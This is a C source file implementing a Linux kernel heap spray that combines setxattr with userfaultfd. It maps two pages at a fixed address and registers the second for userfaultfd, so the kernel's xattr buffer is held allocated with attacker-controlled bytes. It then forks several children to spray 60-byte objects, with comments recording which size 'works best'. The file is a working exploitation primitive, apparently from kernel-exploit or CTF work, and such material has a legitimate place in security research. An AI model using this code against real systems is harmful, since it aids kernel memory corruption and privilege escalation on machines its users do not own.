#include <sys/xattr.h>
#include <stdio.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <pthread.h>
#include <inttypes.h>
#include <sys/types.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <poll.h>

typedef uint8_t u8;
typedef uint64_t u64;

#define FAULTY_ADDR 0x20000000

// Different sizes to try to see which one works best
size_t buffer_sizes[] = {
	0x20,
	0x40,
	0x80,
	0x100,
	0x120,
	0x200,
	0x400,
	0x800,
	0x1000,
	0x1500,
	0x2000,
	0x4000,
	0x8000,
	0xffff
};

// I found 64 (60) bytes to be the right spot
// #define BUFSIZE 60

// Use this to communicate with the parent/ child depending on who we are
static int FORK_PIPE = 0;

/*
+------------+
| First page |
|            | <- This page contains the data we want to spray
| xattr start|
+------------|
|  overrun   |
| *unmapped* | <- This page is never read and causes a userfaultfd event when read from
|            |    (it *is* mapped though, just never actually read from/ written to until setxattr)
| Second page|    we don't control the last 8 bytes that are in this page as part of our spray
+------------+
*/

u8 *setup_pg() {
	u8 *ptr = mmap((void *)FAULTY_ADDR, 0x2000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, 0, 0);
	if (!ptr) {
		perror("mmap couldn't map the page\n");
		exit(EXIT_FAILURE);
	}

	// Init first page
	for (int i = 0; i < 0x1000; i++) {
		ptr[i] = 'A';
	}

	// Don't touch the second page-
	// this will cause a page fault on reference in the kernel :)

	return ptr;
}

// See userfaultfd documentation: https://man7.org/linux/man-pages/man2/userfaultfd.2.html
static void * userfaultfd_thread(void *arg)
{
	static struct uffd_msg msg;   /* Data read from userfaultfd */
	static int fault_cnt = 0;     /* Number of faults so far handled */
	long uffd;                    /* userfaultfd file descriptor */
	static char *page = NULL;
	struct uffdio_copy uffdio_copy;
	ssize_t nread;

	uffd = (long) arg;

	/* Loop, handling incoming events on the userfaultfd
		file descriptor. */
	while(true) {
		/* See what poll() tells us about the userfaultfd. */

		struct pollfd pollfd;
		int nready;
		pollfd.fd = uffd;
		pollfd.events = POLLIN;
		nready = poll(&pollfd, 1, -1);
		if (nready == -1) {
			perror("poll\n");
			exit(EXIT_FAILURE);
		}

		/* Read an event from the userfaultfd. */

		nread = read(uffd, &msg, sizeof(msg));
		if (nread == 0) {
			printf("EOF on userfaultfd!\n");
			exit(EXIT_FAILURE);
		}

		if (nread == -1) {
			perror("read");
			exit(EXIT_FAILURE);
		}

		/* We expect only one kind of event; verify that assumption. */

		if (msg.event != UFFD_EVENT_PAGEFAULT) {
			fprintf(stderr, "Unexpected event on userfaultfd\n");
			exit(EXIT_FAILURE);
		}

		// Perform a blocking read on the pipe to the parent, waitiing for them to wake us up
		// printf("Waiting for parent to wake us up...\n");
		char buf[4];
		read(FORK_PIPE, buf, 4);
		close(FORK_PIPE);
		close(uffd);
		exit(EXIT_FAILURE);
	}
}

void setup_userfaultfd() {
	int ufd = syscall(SYS_userfaultfd, 0);
	// printf("We got userfaultfd fd %d\n", ufd);

	// UFFDIO_API
	struct uffdio_api obj1;
	obj1.api = UFFD_API;
	obj1.features = 0;
	int retval = ioctl(ufd, UFFDIO_API, &obj1);

	if (retval) {
		perror("Error doing UFFDIO_API ioctl\n");
		printf("%d\n", errno);
		exit(EXIT_FAILURE);
	}

	struct uffdio_register obj2;
	obj2.range.start = FAULTY_ADDR; // Where we mmap the 2 pages
	obj2.range.len = 0x2000; // 2 pages
	obj2.mode = UFFDIO_REGISTER_MODE_MISSING;
	retval = ioctl(ufd, UFFDIO_REGISTER, &obj2);

	if (retval) {
		perror("Error doing UFFDIO_REGISTER\n");
		exit(EXIT_FAILURE);
	}

	pthread_t thr;
	pthread_create(&thr, NULL, userfaultfd_thread, (void *) ufd);
}

// previously was runit:
int main (int argc, char **argv) {

	int NUM_CHILDREN = 4;

	if (argc == 2) {
		NUM_CHILDREN = atoi(argv[1]);
	}

	int pipes[2];
	pipe(pipes);

	for (int i = 0; i < NUM_CHILDREN; i++) {
		pid_t newpid = fork();
		if (0 == newpid) {
			close(pipes[1]);
			sleep(2);
			FORK_PIPE = pipes[0];
			u8 *page_to_use = setup_pg();
			setup_userfaultfd();

			// Trying different buffer sizes:
			// size_t BUFSIZE = buffer_sizes[i % 7];
			// 60 works best
			size_t BUFSIZE = 60;

			u8 retval = setxattr("/tmp/test", "testvari", (page_to_use + 0x1000) - BUFSIZE + 8, BUFSIZE, XATTR_CREATE);
			if (retval != 0) {
				perror("Error doing setxattr\n");
				exit(EXIT_FAILURE);
			}

			exit(EXIT_FAILURE);
			while(true);
		}
		else {
			// Parent does nothing
		}
	}

	close(pipes[0]);
	// printf("All children launched\n");
	sleep(5);
	// printf("Waking the children up\n");
	// sleep(1);

	write(pipes[1], "Hey", 4);
	exit(EXIT_SUCCESS);
}

// Launch a number of workers
// int main() {
// 	static pthread_t threads[4];
// 	for (int i = 0; i < 4; i++) {
// 		pthread_create(&threads[i], NULL, &runit, 0);
// 	}
// }
